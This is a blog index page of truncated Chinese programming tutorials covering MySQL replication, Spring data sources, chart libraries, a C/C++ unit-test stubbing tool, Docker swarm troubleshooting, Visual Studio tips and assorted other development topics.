birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 8=&gt;Student(name=张1, age=20, address=深圳8栋大楼, birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 9=&gt;Student(name=张1, age=21, address=深圳9栋大楼, birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 例子2 写测试
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4612935561dfc55373cc97bb27289591/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99e70a69a6f1c48a4493479303bdfebb/" rel="bookmark">
			mysql主从复制&amp;mysql&#43;keepalived实现高可用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、mysql主从复制 1. mysql安装 另一篇博客已经介绍mysql的安装教程，请移步：
https://blog.csdn.net/qq_28197005/article/details/120763590?spm=1001.2014.3001.5501
2. mysql主从复制配置 2.1 mysql主从复制原理概述 Mysql 中有一种日志叫做 bin 日志（二进制日志）。这个日志会记录下所有修改了数据库的SQL 语句（insert,update,delete,create/alter/drop table, grant 等等）。
主从复制的原理其实就是把主服务器上的 bin 日志复制到从服务器上执行一遍，这样从服务器上的数据就和主服务器上的数据相同了。
2.2 主从复制过程 主节点必须启用二进制日志，记录任何修改了数据库数据的事件。从节点开启一个线程（I/O Thread)把自己扮演成 mysql 的客户端，通过 mysql 协议，请求主节点的二进制日志文件中的事件主节点启动一个线程（dump Thread），检查自己二进制日志中的事件，跟对方请求的位置对比，如果不带请求位置参数，则主节点就会从第一个日志文件中的第一个事件一个一个发送给从节点。从节点接收到主节点发送过来的数据把它放置到中继日志（Relay log）文件中。并记录该次请求到主节点的具体哪一个二进制日志文件内部的哪一个位置（主节点中的二进制文件会有多个，在后面详细讲解）。从节点启动另外一个线程（sql Thread ），把 Relay log 中的事件读取出来，并在本地再执行一次。 2.3 配置前准备 准备的服务器列表：
主节点：192.168.159.129从节点1: 192.168.159.128从节点2: 192.168.159.130
采用一主两从的架构部署，三台服务器均为虚拟机，同样也可以在一台服务器上部署主从复制关系，但是生产中不建议； 2.4 主从节点配置 在配置文件/etc/my.cnf中加入以下配置：
log-bin = mysql-bin # 开启二进制日志，主节点必须要开启，从节点可以不开。 server-id = 129 # 服务ID号，主从节点都需要，且要唯一，一般配置为IP地址后面几位 2.5 登录数据库配置 2.5.1 主库配置 需要创建一个用户，用户需要授权，用于从库来同步数据。由于我直接用的root用户，该步骤省略；
GRANT REPLICATION SLAVE ON *.* to 'mysync'@'%' identified by 'q123456'; 配置完成之后，登录主库，查看目前主库的信息show master status;：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99e70a69a6f1c48a4493479303bdfebb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5004e1772698a1f738e53bd99e0ff4fa/" rel="bookmark">
			@Transactional导致 dynamic-datasource-spring-boot-starter失效原因分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境：controller --&gt;Aservice–&gt;Bservice–&gt;Bdao(A表示A数据源，B表示B数据源)
Aservcie使用Transactional注解
1、dynamic-datasource@DB切面是可以将数据源信息push到DynamicDataSourceContextHolder类的ThreadLocal&lt;Deque&gt; LOOKUP_KEY_HOLDER中
2、如果controller调用service，且controller --&gt;Aservice–&gt;Bservice–&gt;Bdao(A表示A数据源，B表示B数据源)，当且仅当Aservice使用@Transactional进行事物管理时，当controller --&gt;Aservice，此时AbstractPlatformTransactionManager 类调用doBegin(transaction, definition)方法，将执行TransactionSynchronizationManager的ThreadLocal&lt;Map&lt;Object, Object&gt;&gt; resources 加入A数据源
3、AbstractPlatformTransactionManager 类获取事物时候将会判断事物是否包含数据源，如果有则认为该事物已经存在，将进行事物的类型判断，如果是PROPAGATION_REQUIRES_NEW类型，将创建新事物，新事物将拥有新的数据源持有Holder，默认的话则继承事物
4、Aservice–&gt;Bservcie虽然可以实现1中所述，但是Bservcie–&gt;Bdao时，DataSourceUtils执行doGetConnection时候，将会执行TransactionSynchronizationManager.getResource(dataSource)获取事物数据源A（源于2的结论），此时多数剧源形同虚设，失效，
方案：
1、Bservcie使用PROPAGATION_REQUIRES_NEW 类型事物，创建新事物 原因为上述3
2、使用Aservcie 的@Transactional替换成@DSTransactional注解即可，原因如下：
dynamic-datasource-spring-boot-starter启动时，进行DynamicDataSourceAutoConfiguration初始化，aop自定义事物，此时不走spring事物规则，将使用自定义事物，这个看起来很简单的事物规则，规避了复杂业务逻辑下的不便，代码如下：
@Slf4j public class DynamicLocalTransactionAdvisor implements MethodInterceptor { @Override public Object invoke(MethodInvocation methodInvocation) throws Throwable { if (!StringUtils.isEmpty(TransactionContext.getXID())) { return methodInvocation.proceed(); } boolean state = true; Object o; String xid = UUID.randomUUID().toString(); TransactionContext.bind(xid); try { o = methodInvocation.proceed(); } catch (Exception e) { state = false; throw e; } finally { ConnectionFactory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5004e1772698a1f738e53bd99e0ff4fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55400dcbfca0fec4f693c6d404655bfb/" rel="bookmark">
			pyecharts 饼图绘制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于饼图的绘制 基本的饼图环形图玫瑰饼图 基本的饼图 import pandas as pd import numpy as np from pyecharts.charts import * import pyecharts.options as opts #数据 cate = ['Apple', 'Huawei', 'Xiaomi', 'Oppo', 'Vivo', 'Meizu'] data = [123, 153, 89, 107, 98, 23] pie=Pie() pie.add("",[list(z) for z in zip(cate,data)] #数据标签展示 ,label_opts=opts.LabelOpts( position="outside", formatter="{d}%",) # 设置其他配置项 pie.set_global_opts( #标题配置项 title_opts=opts.TitleOpts(title="饼图",pos_left='70%'), # 图例配置项 legend_opts=opts.LegendOpts( type_="scroll" , pos_top="20%" , pos_left="80%" , orient="vertical" ), ) 环形图 pie.add("",[list(z) for z in zip(cate,data)] # 离心距离 环形图 ,radius=["
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55400dcbfca0fec4f693c6d404655bfb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1fbd2d3fc0721eed29dc3b60635536d/" rel="bookmark">
			工程师必备：C/C&#43;&#43;单元测试万能插桩工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关注、星标公众号，直达精彩内容
来源：腾讯技术工程
研发效能是一个涉及面很广的话题，它涵盖了软件交付的整个生命周期，涉及产品、架构、开发、测试、运维，每个环节都可能影响顺畅、高质量地持续有效交付。在腾讯安全平台部实际研发与测试工作中我们发现，代码插桩隔离是单元测试工作中的一个强需求，然而业界现有 C/C++插桩工具由于使用上的局限性，运行效率和体验仍有很大改善空间。本文介绍了团队基于研效优化实践而自研的动态插桩工具，旨在实现单元测试的轻量化运行，提高代码覆盖率，从而助力研发团队的效能提升。
问题&amp;思路 目前存在的 C/C++插桩工具，基本上都有各种使用上的局限，比如流行的 gmock，只能对 C++的虚函数进行插桩替换，针对非虚函数，则需要先对被测代码进行改造；同时对于系统接口，C 风格的第三方库代码，也无能为力。
如果可以绕开编译器，直接从底层入手，比如做机器指令修改，则可以不受语法及编译器的束缚，直接达到目的，这样在使用中就 几乎不受限制。
原理 C/C++语言编译后的可执行体，其实就是一个个的函数实现，每个函数的开头就是它的入口。一个函数 A 调用另一个函数 B，就是代码在执行过程中，控制流从函数 A 的某处跳到了函数 B 的开头，所以如果想用一个新的函数 C 取代函数 B，可以在函数 B 的开头用机器码的形式写入如下等价逻辑：
MOVQ ADDRESS_OF_C %RAX //将函数C的地址放到寄存器RAX JMPQ *RAX //无条件跳转到RAX所指向的位置 这样，当控制流从函数 A 进入函数 B 的开始位置的时候，即会执行上述代码，从而直接跳转到 C 的开头处。其最终效果，是所有对函数 B 的调用，都如同直接调用了函数 C。
基于上述原理，被插桩的代码包括第三方库，如 MySql、其他同事未完成的模块、甚至是操作系统的 API 接口，如 read、select 等；
同时，桩函数不仅可以模拟原函数的返回值，实际上它作为一个普通的 C 函数，对原函数有完全的操作能力，比如可以访问传递给原函数调用真实的参数、C++成员变量（针对对成员函数的模拟），给定任意的返回值，访问全局变量、对调用进行计数等。
实际实现中，考虑到不同测试用例间的互不干扰，除了能执行函数替换，还需要在执行完一个测试时还原现场。这些具体细节可以直接参考代码。
使用 对全局函数插桩 原始函数：
int global(int a, int b) { return a + b; } 对应的桩函数：
int fake_global(int a, int b) { //校验参数正确性，确定被测代码传入了正确的值 assert(a == 3); assert(b == 2); //给一个返回值，配合被测代码走特定分支 return a - b; } 插桩示例：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1fbd2d3fc0721eed29dc3b60635536d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94c75cec12ec8fb819e865cb2e7192fc/" rel="bookmark">
			通用算法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hash算法 常见Hash算法总结
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b4c4c6c157291d1459caa6b88d3a50b/" rel="bookmark">
			C语言最重要的知识点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总体上必须清楚的:
1)程序结构是三种: 顺序结构 、选择结构(分支结构)、循环结构。
2)读程序都要从main()入口, 然后从最上面顺序往下读(碰到循环做循环,碰到选择做选择)，有且只有一个main函数。
3)计算机的数据在电脑中保存是以二进制的形式. 数据存放的位置就是它的地址.
4)bit是位 是指为0 或者1。 byte 是指字节, 一个字节 = 八个位.
概念常考到的：
1、编译预处理不是C语言的一部分，不占运行时间，不要加分号。C语言编译的程序称为源程序，它以ASCII数值存放在文本文件中。
2、define PI 3.1415926; 这个写法是错误的，一定不能出现分号。
3、每个C语言程序中main函数是有且只有一个。
4、在函数中不可以再定义函数。
5、算法：可以没有输入，但是一定要有输出。
6、for循环中for语句写成 for（i=0; i&lt;100; i++）; ，这个写法是有问题的，for的后面如果出现分号，相当于for循环体是空的。
7、break可用于循环结构和switch语句。
8、逗号运算符的级别最低，赋值的级别倒数第二。
第一章 C语言的基础知识
第一节、对C语言的基础认识
1、C语言编写的程序称为源程序，又称为编译单位。
2、C语言书写格式是自由的，每行可以写多个语句，可以写多行。
3、一个C语言程序有且只有一个main函数，是程序运行的起点。
第二节、熟悉vc++
1、VC是软件，用来运行写的C语言程序。
2、每个C语言程序写完后，都是先编译，后链接，最后运行。（.c—.obj—.exe）这个过程中注意.c和.obj文件时无法运行的，只有.exe文件才可以运行。
第三节、标识符
1、标识符
合法的要求是由字母，数字，下划线组成。有其它元素就错了。
并且第一个必须为字母或则是下划线。第一个为数字就错了
2、标识符分为关键字、保留标识符、用户标识符。
关键字：不可以作为用户标识符号。main define scanf printf 都不是关键字。容易误解的地方：If是可以做为用户标识符。因为If中的第一个字母大写了，所以不是关键字。
保留标识符：是系统保留的一部分标识符，通常用于系统定义和标准库函数的名字。例如，以下划线开始的标识符通常用于定义系统变量，不能使用把这些标识符来定义自己的变量。虽然它们也是合法的标识符，但是用它们来做一般标识符可能会出现运行错误。
用户标识符：基本上每年都考，详细请见书上习题。
用户标识符用来为变量、符号常量、数组、函数等取名。关键字不可以作为用户标识符。
第四节：进制的转换
十进制转换成二进制、八进制、十六进制。
二进制、八进制、十六进制转换成十进制。
第五节：整数与实数
1）C语言只有八、十、十六进制，没有二进制。但是运行时候，所有的进制都要转换成二进制来进行处理。
a、C语言中的八进制规定要以0开头。018的数值是非法的，八进制是没有8的，逢8进1。
b、C语言中的十六进制规定要以0x开头。
2)小数的合法写法：C语言小数点两边有一个是零的话，可以不用写。
1.0在C语言中可写成1.
0.1在C语言中可以写成.1。
3）实型数据的合法形式：
a、2.333e-1 就是合法的，且数据是2.333×10-1。
b、考试口诀：e前e后必有数，e后必为整数。请结合书上的例子。
4） 整型一般是4个字节, 字符型是1个字节，双精度一般是8个字节：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b4c4c6c157291d1459caa6b88d3a50b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef6aacb52dc297714f487f1c463578c4/" rel="bookmark">
			Java中变量未初始化问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 今天遇到一个Java变量未初始化就使用的问题，后详细了解后才明白。
Java中只有类成员变量才会默认初始化值。Int类型默认值为0，你定义的是方法内的局部变量，需要初始化才能进行运算。
例子：
public class Main { int var1 = 1; int var2; // 类成员变量 public static void main(String[] args) { int var3 = 3; Main main = new Main(); System.out.println(main.var1+main.var2+var3); // 4 } 输出结果：
4 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3d53b2cf9972fa92f219387405bc2ce/" rel="bookmark">
			docker swarm node 状态异常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 docker swarm node 状态异常 客户生产环境服务访问不了，排查中发现 docker swarm node STATUS 为 Down，特此记录解决过程
解决过程 根据docker官方文档尝试新建集群
1、尝试移除集群，不成功
docker swarm leave ## 移除集群命令 docker swarm leave --force ## 根据上一条命令提示，添加 --force参数 2、尝试找到swarm数据文件，发现该文件异常的大。说明此数据是有问题，停止 docker 服务，备份该文件，重启docker服务，重新查看node状态，已经恢复正常
find / -name tasks.db systemctl stop docker mv tasks.db tasks.db.bak systemctl start docker 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9406c4fa95e9f3eda9ac6c770e87afd/" rel="bookmark">
			使用VS远程连接linux并进行开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		此功能需要vs2015及以上，此处以VS2019为例
在安装VS时需要把linux支持选上，已经安装了的可以通过修改VS进行安装。
具体流程： 首先新建项目
选择Linux的控制台应用程序
选择好位置、名称后创建即可
这样我们的项目会创建一个main文件，其内容为：
#include &lt;cstdio&gt; int main() { printf("%s 向你问好!\n", "ThreadPool"); return 0; } 点击此处 添加远程连接
注意linux需要有ssh服务，正常填写即可
我这里连的是阿里云的，注意需要获取阿里云的外网ip，这样才能顺利连接。
注意：远程连接的linux应当有gdb，没有的话要用包管理器安装（Ubuntu下为apt-get CentenOS下为yum）
下载安装即可：
sudo apt-get install gdb 接下来要对这个连接进行一定设置
工具-&gt;选项 一定要把勾打上，然后点击更新（第一次为下载） ，这样编写代码才有智能提示
然后就会下载更新这个标头 等待完成即可
接着查看属性窗口
里面有一堆设置，可以按照需要进行设置
可以看到远程根目录
这个目录是我们程序在linux的位置，可以进行设置
尝试运行此项目
我们打个断点后运行这个项目
可以看到已经显示运行的结果辣~
在linux端查看编写的程序
我们的远程根目录是~/projects
我们就到这个位置去查看
这个就是我们的项目，再进行一层
可以看到main.cpp文件。bin是可执行程序的目录，obj是缓存文件。
之后就可以畅快的使用VS来（远程）编写linux程序了~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ab5176fe6968aa4541fd9bb84d5ae5d/" rel="bookmark">
			VS断点调试技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		条件断点： 条件断点就是当满足某种条件时才会触发的断点。
例如在循环体中，我们想查看第一万次循环的结果，显然不能一步一步运行程序，而应当在断点处设置条件。
使用流程：
1、首先需要打一个断点
2、在断点处点击设置按钮
跳出如下提示框
3、然后勾选条件，并填入断点的条件
4、开始调试，会看到断点被触发了（注意颜色和一般的断点不一样）
5、查看相关信息
断点操作： 在断点设置中，不仅有条件，还有操作，借助操作，我们可以打印一些信息，利用VS的这个功能，可以不用在代码中显示的写打印代码了~（当然这是有利有弊的，打印信息直接写在代码中，可以更快复现，结合宏来使用也非常方便，而这种断点操作，复现麻烦，适合用于排错）。
例如我们需要在循环体中查看值的变化，但不想写修改代码，这个时候就可以借助断点操作了。
操作流程
1、首先需要打一个断点
2、在断点处点击设置按钮
跳出如下提示框
3、勾选操作，并填入需要打印的信息
注意 {} 表示中间的是一个变量
输出结果会在输出窗口中打印
4、开始调试，会看到断点被触发了（注意颜色和一般的不一样）
如下是输出窗口的输出：
5、且断点操作可以和条件断点结合使用
输出如下：
6、VS提供的特殊变量，可以在断点操作中打印其信息
利用这些特殊变量可以很容易的获取当前程序运行的一些信息，注意其前缀都为$
其具体含义如下：
$ADDRESS 当前指令的地址 $CALLED 调用当前函数的函数名称 $CALLSTACK 当前调用堆栈 $FILEPOS 当前文件和行位置 $FUNCTION 当前函数的名称 $PID 当前进程的ID $PNAME 当前进程的名称 $TICK 自系统运行以来的毫秒数，最大为49.7天 $TID 当前线程的ID $TNAME 当前线程的名称 例子：输出当前断点所在的文件、行位置及当前函数的名称
输出：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/223fc7ae6c75c8883a54455d9b1bfdb2/" rel="bookmark">
			Unity3D 异步Socket 网络编程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单的异步socket示例
简单过一下主要使用到的相关API:
public class Socket : IDisposable { public Socket(AddressFamily addressFamily, SocketType socketType, ProtocolType protocolType); // 连接指定地址&amp;端口 public void Connect(EndPoint remoteEP); // 异步接收， 指定callback函数处理到来的函数(自动创建线程去跑callback函数) public IAsyncResult BeginReceive(byte[] buffer, int offset, int size, SocketFlags socketFlags, AsyncCallback callback, object state); // 异步发送, 类似BeginReceive public IAsyncResult BeginSend(byte[] buffer, int offset, int size, SocketFlags socketFlags, AsyncCallback callback, object state); //.... } Unity3D新建脚本文件：ClientSocket.cs
using UnityEngine; using System; using System.Net; using System.Net.Sockets; using System.Text; using UnityEngine.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/223fc7ae6c75c8883a54455d9b1bfdb2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c5cb58e5e30e681148d13b93c65bae6/" rel="bookmark">
			Pytorch遇到报错Expected more than 1 value per channel when training, got input size torch.Size
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Pytorch遇到
Expected more than 1 value per channel when training, got input size torch.Size([1, 256, 1, 1])
楼主遇到这个报错，通过pycharm定位到断言的位置
def _verify_batch_size(size: List[int]) -&gt; None: # XXX: JIT script does not support the reduce from functools, and mul op is a # builtin, which cannot be used as a value to a func yet, so rewrite this size # check to a simple equivalent for loop # # TODO: make use of reduce like below when JIT is ready with the missing features: # from operator import mul # from functools import reduce # # if reduce(mul, size[2:], size[0]) == 1 size_prods = size[0] for i in range(len(size) - 2): size_prods *= size[i + 2] if size_prods == 1: raise ValueError("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c5cb58e5e30e681148d13b93c65bae6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39999da67a77d502567b5d233ebcdb4b/" rel="bookmark">
			龙芯3A5000LL与i7-10700的UnixBench跑分对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		龙芯 架构： loongarch64
字节序： Little Endian
CPU: 4
在线 CPU 列表： 0-3
每个核的线程数： 1
每个座的核数： 4
座： 1
NUMA 节点： 1
CPU 系列： Loongson-64bit
型号名称： Loongson-3A5000LL
BogoMIPS： 4600.00
L1d 缓存： 64K
L1i 缓存： 64K
L2 缓存： 256K
L3 缓存： 16384K
英特尔 架构： x86_64
处理器操作模式： 32-bit, 64-bit
字节序： Little Endian
地址大小： 39 bits physical, 48 bits virtual
CPU： 16
在线 CPU 列表： 0-15
每个核的线程数： 2
每个座的核数： 8
座： 1
NUMA 节点： 1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39999da67a77d502567b5d233ebcdb4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/011eb010f0bc25468ef94396c76fb7b0/" rel="bookmark">
			Vue3 &#43; Ts 封装axios
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		封装思路 index.ts
我们需要在src的根目录下创建一个axios文件夹，其中创建一个index.ts文件，这个文件主要用来封装axios的配置（实例化请求配置、请求拦截器、相应拦截器）及相应的方法（登录跳转、消息提示、错误处理等）
base.ts
这个文件主要用于项目扩展的情况下 不同模块需要调用不同接口（请求的base地址 baseURL ）而前期做的准备，便于后期的维护
request.ts
主要用于封装基于axios配置的get/post/put/delete等使用方法。
api.ts
在后面的 main.ts 中引入该模块，包括所有接口数据信息写入该文件中。
index.ts 封装如下。考虑到单一职责，index这块只封装axios
// index.ts import axios, { AxiosRequestConfig, Method } from "axios"; import router from "@/router"; import store from "@/store"; import { message } from 'ant-design-vue' import { storage } from "../storage/storage"; import { dataList } from "@/components/aspin/data"; /** * 跳转登录页 * 携带当前页面路由，以期在登录页面完成登录后返回当前页面 */ const toLogin = () =&gt; { router.replace({ name: 'LoginPage', }); } /** * 请求失败后的错误统一处理 * @param {Number} status 请求失败的状态码 */ const errorHandle = (status: number, other: string) =&gt; { // 状态码判断 switch (status) { case 302: message.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/011eb010f0bc25468ef94396c76fb7b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/763f5675591f539f0a7c48a406f25eb2/" rel="bookmark">
			利用“bert模型”预测英语“完形填空”答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		被课程大作业逼着学习了解了一下bert，转念一想，这不是正好用来解答英语完形填空作业吗，因此有了以下代码：
首先我们导入会用到的库啊，pytorch_pretrained_bert这个库我是第一次用啊，需要去pip install 或者conda install：
import numpy as np import torch from pytorch_pretrained_bert import BertTokenizer, BertForMaskedLM import re from random import * 之后进行一些bert模型及词库的导入：
tokenizer = BertTokenizer.from_pretrained('bert-base-uncased') #导入词库 bert = BertForMaskedLM.from_pretrained('bert-base-uncased') #导入模型 bert.eval() bert.to('cuda:0') #移动到GPU，没有GPU就不要这行代码了 然后我先导入了问题（选项）文本，用的是txt文件:
#选项提取 choices=ques_proce('question.txt') #处理问题（选项）文本 choices_idx=[] for choice in choices: #进行tokenize化 choice_idx=tokenizer.convert_tokens_to_ids(choice) choices_idx.append(choice_idx) 处理问题的函数如下：
def ques_proce(file): f = open(file, 'r', encoding='gb18030', errors='ignore') buffer = f.readline() choices=[] while buffer!='': list=buffer.split() one_que=[list[idx] for idx in [2,4,6,8]] choices.append(one_que) buffer=f.readline() return choices question.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/763f5675591f539f0a7c48a406f25eb2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/913b1d3f3b84635a594faa5756b58809/" rel="bookmark">
			Recoil是React新的“Redux”吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Recoil 是一个新的 React 状态管理库，它允许您以 Reactish 的方式管理全局/可共享状态。Recoil是由 Facebook 团队开发的。在这篇博客中，我们将看看 useRecoilState 钩子的简单使用。
让我们来看一个非常简单的问题陈述。我们希望在两个兄弟/并行子组件中共享计数状态变量。
第一个解决方案：Prop-Drilling 最简单的可能解决方案是将 count 移动到一个共同的父级并通过 props 向下传递。
这解决了我们的问题，但会导致以下问题
1.这里我们有一个简单的级别树，但是如果我们有更多级别，比如说 4 或 5 级呢？这么多级别会使代码难以维护。2.整个组件树将重新渲染——而不仅仅是 2 个叶子组件。3.父组件将被状态重载，并可能导致不必要的重新渲染。
第二种解决方案：Context API 我们可以使用 React 的 context API。上下文提供了一种通过组件树传递数据的方法，而无需在每个级别手动传递数据。
我们需要将父组件包装在 Context.Provider 中，子组件（C1&amp;C2）可以使用 useContext 钩子订阅它。但是，使用这种方法有一些限制：
1。需要多个上下文提供者——一个 Context.Provider 只能共享一个值，而不是一组不确定的值——每个值都有自己的消费者。
1.复杂的单元测试用例——需要创建一个模拟提供程序来编写单元测试用例。2.当上下文发生变化时，我们仍然会重新渲染树中的每个组件。（这就是为什么需要 redux）
第三种解决方案：useRecoilState 最后我将介绍 useRecoilState，我们可以通过使用原子创建可共享的订阅者状态单元来轻松实现这一点 。为了利用 Recoil API，我们需要将父组件包装在 RecoilRoot 中。
让我们看看为什么 Recoil 被称为“Reactish”和“Minimal”。
我比较 useState 和 useRecoilState 只是为了显示语法的相似程度。
总结：组件间的状态共享只能通过将 state 提升至它们的公共祖先来实现，但这样做可能导致重新渲染一颗巨大的组件树。
Context 只能存储单一值，无法存储多个各自拥有消费者的值的集合。
以上两种方式都很难将组件树的顶层（state 必须存在的地方）与叶子组件 (使用 state 的地方) 进行代码分割。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/913b1d3f3b84635a594faa5756b58809/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd67c4a33b467f25ab60d9a7c7d1f0a3/" rel="bookmark">
			echarts 饼图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		echarts 饼图 官网：Documentation - Apache ECharts
******************* 配置属性
option = { series: [ { type: 'pie', //type为pie，表示图表为饼图 data: [ { value: 335, name: '直接访问' }, { value: 234, name: '联盟广告' }, { value: 1548, name: '搜索引擎' } ] } ] }; 基本属性
id：组件id，默认不指定 name：系列名称 type：series图表类型，常用值：bar（柱形图）、line（折线图）、pie（饼图）、scatter（散点图） colorBy: series（同一系列颜色相同）、data（同一维度颜色相同） legendHoverLink：鼠标滑过时legend（图标）是否高亮，默认true selectedMode：是否支持多个选中，可选值：true、false（默认）、single、multiple selectedOffset：选中扇区的偏移距离 clockwise：饼图的扇区是否是顺时针排布，默认true startAngle：起始角度，从0到360度，默认90度 minAngle：最小扇区角度，用于防止某个值过小导致扇区太小影响交互 minShowLabelAngle：小于这个角度的扇区，不显示标签（label、labelLine） roseType：是否展示成南丁格尔图，通过半径区分数据大小，可选值： radius：扇区圆心角展现数据的百分比，半径展现数据的大小 area：所有扇区圆心角相同，仅通过半径展现数据大小 avoidLabelOverlap：是否启用防止标签重叠策略，默认true（开启） stillShowZeroSum：是否在数据和为0的时候仍显示扇区，默认true cursor：鼠标悬浮时在图形元素上时鼠标的样式是什么，如：pointer zlevel：图形的zlevel值，用于canvas分层，数值大的展示在上面 z：图形的z值，优先级比zlevel低，用韵canvas分层，数值大的展示在上面 left：组件离容器左侧的距离，可选值：10（像素）、10%、left、cneter、right top：件离容器上侧的距离，可选值：10（像素）、10%、top、middle、bottom right：组件离容器右侧的距离，可选值：10（像素）、10% bottom：组件离容器下侧的距离，可选值：10（像素）、10% width：宽度，默认auto（自适应） height：高度，默认auto（自适应） center：饼图的中心坐标，数组的第一项是横坐标，第二项是纵坐标，如：[400, 300]、['50%', '50%'] radius：饼图的半径，如：10，10%，[0,10]（内半径，外半径） seriesLayoutBy：数据集映射方式，可选值：column（默认）、row datasetIndex：数据集index，如果series.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd67c4a33b467f25ab60d9a7c7d1f0a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e7dc08e487b171da9fc35efe61db687/" rel="bookmark">
			操作系统(实验2)软中断和管道通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.小知识(本篇没用到)
按^c键 就是按 ctrl+c
2.软中断通信
#include &lt;stdio.h&gt; #include &lt;signal.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; int wait_flag; void stop(); main(){ int pid1,pid2; signal(SIGINT,stop); while((pid1=fork())==-1); //创建子进程 //控制权交到父进程 if(pid1&gt;0){ printf("\n I am the parent process,my pid is: %d \n",getpid()); while((pid2=fork())==-1); //创建子进程 if(pid2&gt;0){ //控制权交到父进程 wait_flag=1; printf("\n I am sleeping for 10s\n"); sleep(10); //父进程等待10s kill(pid1,17); //向子进程1发出信号17 kill(pid2,17);//向子进程2发出信号17 int kpid1=wait(0); //等待子进程1的结束信号 printf("\n child process has ended %d \n",kpid1); int kpid2=wait(0);//等待子进程2的结束信号 printf("\n child process has ended %d \n"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e7dc08e487b171da9fc35efe61db687/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99118db9baf0cd676d49ad2608e4b01a/" rel="bookmark">
			柚子班第四期学习总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		spring、spring boot、spring cloud spring spring 是一个针对 java 语言的基础架构支持的框架
常见的模块有：Spring JDBC、Spring MVC、Spring Security、Spring AOP、Spring ORM、Spring Test
通过 spring 的组件我们可以通过配置的方式快速的支持业务
Spring 通过 IOC 和 AOP 提供了低耦合、轻量级、高扩展、复用性强等能力
IOC
